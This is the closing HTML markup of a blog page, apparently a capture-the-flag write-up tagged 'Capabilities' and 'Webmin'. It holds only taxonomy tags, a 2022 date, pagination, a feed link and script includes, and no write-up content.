    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#capabilities" class="page__taxonomy-item" rel="tag">Capabilities</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#webmin" class="page__taxonomy-item" rel="tag">Webmin</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-04-02T00:00:00-06:00">April 02, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-laboratory/" class="pagination--pager" title="Hack The Box Laboratory
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
